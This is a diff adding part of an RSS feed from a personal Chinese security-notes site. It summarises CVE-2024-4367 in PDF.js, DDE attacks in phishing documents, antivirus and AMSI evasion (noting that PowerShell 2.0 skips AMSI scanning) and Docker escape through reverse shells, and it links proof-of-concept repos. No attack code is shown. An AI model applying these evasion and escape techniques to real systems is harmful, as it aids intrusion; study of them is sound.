+      <pubDate>Wed, 29 May 2024 03:32:12 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>校验</h2>
+<blockquote>
+<p><a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener noreferrer">verify.cobaltstrike.com</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202410171630607.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2024-4367-PDF.js中任意JavaScript执行</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/PDF%E9%98%85%E8%AF%BB%E5%99%A8%E6%BC%8F%E6%B4%9E/CVE-2024-4367_Arbitrary-JavaScript-execution-in-PDF-js/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/PDF%E9%98%85%E8%AF%BB%E5%99%A8%E6%BC%8F%E6%B4%9E/CVE-2024-4367_Arbitrary-JavaScript-execution-in-PDF-js/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2024-4367-PDF.js中任意JavaScript执行</source>
+      <description>CVE-2024-4367-PDF.js中任意JavaScript执行
+
+(1) X 上的 Thomas Rinsma：“Just released the write-up for CVE-2024-4367, a bug I found recently in PDF.js (and hence in Firefox), resulting in ...</description>
+      <pubDate>Wed, 29 May 2024 02:56:19 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://x.com/thomasrinsma/status/1792503111317119185" target="_blank" rel="noopener noreferrer">(1) X 上的 Thomas Rinsma：“Just released the write-up for CVE-2024-4367, a bug I found recently in PDF.js (and hence in Firefox), resulting in arbitrary JavaScript execution when opening a malicious PDF. https://t.co/sex6fR0xHS” / X</a></p>
+<p><a href="https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/" target="_blank" rel="noopener noreferrer">CVE-2024-4367 - Arbitrary JavaScript execution in PDF.js — Codean Labs</a></p>
+<p><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq" target="_blank" rel="noopener noreferrer">Arbitrary JavaScript execution upon opening a malicious PDF · Advisory · mozilla/pdf.js · GitHub</a></p>
+<p><a href="https://github.com/LOURC0D3/CVE-2024-4367-PoC" target="_blank" rel="noopener noreferrer">GitHub - LOURC0D3/CVE-2024-4367-PoC: CVE-2024-4367 &amp; CVE-2024-34342 Proof of Concept</a></p>
+<p><a href="https://github.com/s4vvysec/CVE-2024-4367-POC" target="_blank" rel="noopener noreferrer">GitHub - s4vvysec/CVE-2024-4367-POC: CVE-2024-4367 arbitrary js execution in pdf js</a></p>
+<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/1522484211581222" target="_blank" rel="noopener noreferrer">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
+</blockquote>
+<p>PDF.js 是由 Mozilla 维护的基于 JavaScript 的 PDF viewer</p>
+<p>CVE-2024-4367允许攻击者在打开恶意 PDF 文件后立即执行任意 JavaScript 代码</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202405241346924.png" type="image/png"/>
+    </item>
+    <item>
+      <title>DDE</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/DDE/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/DDE/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">DDE</source>
+      <description>DDE
+
+环境: Win7 + Office 2016
+可以在 MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn) 找对应的镜像
+
+
+Office 2016: ed2k://|file|cn_office_professional_plus_2016_x86_x64_dvd_6969182.iso|2588266496|27EEA...</description>
+      <pubDate>Wed, 29 May 2024 02:56:03 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p>环境: Win7 + Office 2016</p>
+<p>可以在 <a href="https://msdn.itellyou.cn/?ang=2h-cn" target="_blank" rel="noopener noreferrer">MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)</a> 找对应的镜像</p>
+<ul>
+<li>
+<p>Office 2016: <code>ed2k://|file|cn_office_professional_plus_2016_x86_x64_dvd_6969182.iso|2588266496|27EEA4FE4BB13CD0ECCDFC24167F9E01|/</code></p>
+</li>
+<li>
+<p>Win7:</p>
+<p><a href="https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0" target="_blank" rel="noopener noreferrer">原版软件 (itellyou.cn)</a></p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><a href="https://cloud.tencent.com/developer/article/1816083" target="_blank" rel="noopener noreferrer">鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</blockquote>
+<p>DDE (Dynamic Data Exchange) 是一种用于在Windows应用程序之间交换数据的协议</p>
+<p>攻击者可以利用 DDE 通过自定义字段插入到Word或Excel文档中，用于执行恶意代码</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406061623809.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH5-函数</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH5-%E5%87%BD%E6%95%B0.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH5-%E5%87%BD%E6%95%B0.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH5-函数</source>
+      <description>CH5-函数
+
+
+CH5-函数
+
+CH5.1.函数声明
+CH5.2.递归
+
+EX5.1.循环改递归
+EX5.2.记录同名元素次数
+EX5.3.选择性输出节点内容
+EX5.4.处理其他类型节点
+
+
+CH5.3.多返回值
+
+EX5.5.统计单词和图片的数量
+EX5.6.bare return
+
+
+CH5.4.错误
+CH5.5.函数值
+
+EX5.7.通用HT...</description>
+      <pubDate>Tue, 28 May 2024 16:54:04 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/image-20240528113327462.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Malware</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Malware</source>
+      <description>Malware
+各厂商威胁名称整理
+
+安软: 详解安软威胁名称意义 (kaitaku.xyz)
+卡巴: 卡巴斯基：病毒是怎么命名的-PChome</description>
+      <pubDate>Thu, 16 May 2024 02:45:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>各厂商威胁名称整理</h2>
+<ul>
+<li><code>安软</code>: <a href="https://www.kaitaku.xyz/misc/antivirus/" target="_blank" rel="noopener noreferrer">详解安软威胁名称意义 (kaitaku.xyz)</a></li>
+<li><code>卡巴</code>: <a href="https://m.pchome.net/article/content-513157-all.html" target="_blank" rel="noopener noreferrer">卡巴斯基：病毒是怎么命名的-PChome</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>杀毒与免杀</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E4%BB%8E%E5%9F%BA%E7%A1%80%E7%9A%84RAT%E5%87%BA%E5%8F%91%E6%A2%B3%E7%90%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9F%A5%E6%9D%80%E4%B8%8E%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E4%BB%8E%E5%9F%BA%E7%A1%80%E7%9A%84RAT%E5%87%BA%E5%8F%91%E6%A2%B3%E7%90%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9F%A5%E6%9D%80%E4%B8%8E%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">杀毒与免杀</source>
+      <description>杀毒与免杀
+
+
+杀毒与免杀
+
+木马概述
+
+木马的定义
+木马感染的过程
+木马示例
+
+
+特征码查杀
+
+加壳
+
+代码混淆
+编码或加密
+
+Base64编码
+自定义加密
+
+
+填充合法的系统命令
+利用第三方服务
+时间延迟执行
+分割和分散代码
+
+
+
+
+启发式分析
+沙盒分析
+行为监测
+
+AMSI
+
+AMSI Bypass
+改注册表禁用 AMSI
+通过命名空间接口关闭A...</description>
+      <pubDate>Thu, 16 May 2024 02:45:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202312280212445.png" type="image/png"/>
+    </item>
+    <item>
+      <title>AMSI</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E6%9F%A5%E6%9D%80%E6%8A%80%E6%9C%AF/AMSI.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E6%9F%A5%E6%9D%80%E6%8A%80%E6%9C%AF/AMSI.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">AMSI</source>
+      <description>AMSI
+
+amsi绕过总结 - 先知社区 (aliyun.com)
+
+AMSI(Antimalware Scan Interface) 是微软提供的一个标准化接口，旨在增强恶意软件和其他威胁的检测能力，特别是对于那些运行在Windows操作系统上的脚本和解释型代码
+
+Win10 以及 WindowsSever2016 及之后的版本支持 AMSI
+低版...</description>
+      <pubDate>Thu, 16 May 2024 02:45:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/11097" target="_blank" rel="noopener noreferrer">amsi绕过总结 - 先知社区 (aliyun.com)</a></p>
+</blockquote>
+<p>AMSI(Antimalware Scan Interface) 是微软提供的一个标准化接口，旨在增强恶意软件和其他威胁的检测能力，特别是对于那些运行在Windows操作系统上的脚本和解释型代码</p>
+<blockquote>
+<p>Win10 以及 WindowsSever2016 及之后的版本支持 AMSI</p>
+<p>低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202401020527019.png" alt="image-20240102052708985"></p>
+</blockquote>
+<p>AMSI使得应用程序(如PowerShell、VBScript、JavaScript等) 可以将执行前的代码发送到安装的防病毒软件进行扫描</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202401020527019.png" type="image/png"/>
+    </item>
+    <item>
+      <title>查杀技术</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E6%9F%A5%E6%9D%80%E6%8A%80%E6%9C%AF/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Malware/%E6%9F%A5%E6%9D%80%E6%8A%80%E6%9C%AF/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">查杀技术</source>
+      <description>查杀技术</description>
+      <pubDate>Thu, 16 May 2024 02:45:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Docker</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Docker/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Docker/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Docker</source>
+      <description>Docker
+
+Docker
+
+Docker逃逸
+
+反弹 shell 中如何判断自己是否在 docker 容器中
+特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)
+
+写公钥
+写定时任务
+
+
+
+
+
+
+
+
+Docker逃逸
+反弹 shell 中如何判断自己是否在 docker 容器中
+
+
+看当前反弹 shell 的主机名称,...</description>
+      <pubDate>Fri, 10 May 2024 06:37:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#docker">Docker</a>
+<ul>
+<li><a href="#docker%E9%80%83%E9%80%B8">Docker逃逸</a>
+<ul>
+<li><a href="#%E5%8F%8D%E5%BC%B9-shell-%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%87%AA%E5%B7%B1%E6%98%AF%E5%90%A6%E5%9C%A8-docker-%E5%AE%B9%E5%99%A8%E4%B8%AD">反弹 shell 中如何判断自己是否在 docker 容器中</a></li>
+<li><a href="#%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8F%8D%E5%BC%B9shell%E5%88%B0%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E7%9A%84docker%E5%AE%B9%E5%99%A8%E5%90%8E%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%8E%B7%E5%8F%96%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90">特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)</a>
+<ul>
+<li><a href="#%E5%86%99%E5%85%AC%E9%92%A5">写公钥</a></li>
+<li><a href="#%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">写定时任务</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202306190004059.png" type="image/png"/>
+    </item>
+  </channel>
+</rss>
